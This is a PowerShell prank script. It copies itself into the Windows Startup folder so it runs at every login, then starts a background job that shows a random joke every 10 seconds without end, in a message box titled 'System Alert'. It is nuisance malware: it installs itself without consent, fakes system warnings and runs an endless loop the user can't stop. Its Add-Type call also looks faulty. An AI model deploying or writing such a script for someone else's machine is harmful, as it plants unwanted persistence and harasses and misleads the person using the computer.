# Define the file path for persistence
$scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jokeblocker.ps1"

# Check if script is already in startup, if not, copy itself there
if (-not (Test-Path $scriptPath)) {
    Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force
}

# Run in the background as a scheduled job
Start-Job -ScriptBlock {
    Add-Type -TypeDefinition @"
    using System.Windows.Forms;
"@ -Language CSharp

    $jokes = @(
        "Why don't skeletons fight each other? They don't have the guts.",
        "Parallel lines have so much in common. It’s a shame they’ll never meet.",
        "I told my wife she should embrace her mistakes. She gave me a hug.",
        "Why did the scarecrow win an award? Because he was outstanding in his field!",
        "I told my computer I needed a break, and now it won’t stop sending me Kit-Kats."
    )

    while ($true) {
        $joke = $jokes | Get-Random
        [System.Windows.Forms.MessageBox]::Show($joke, "System Alert", 0, 64)
        Start-Sleep -Seconds 10
    }
} | Out-Null
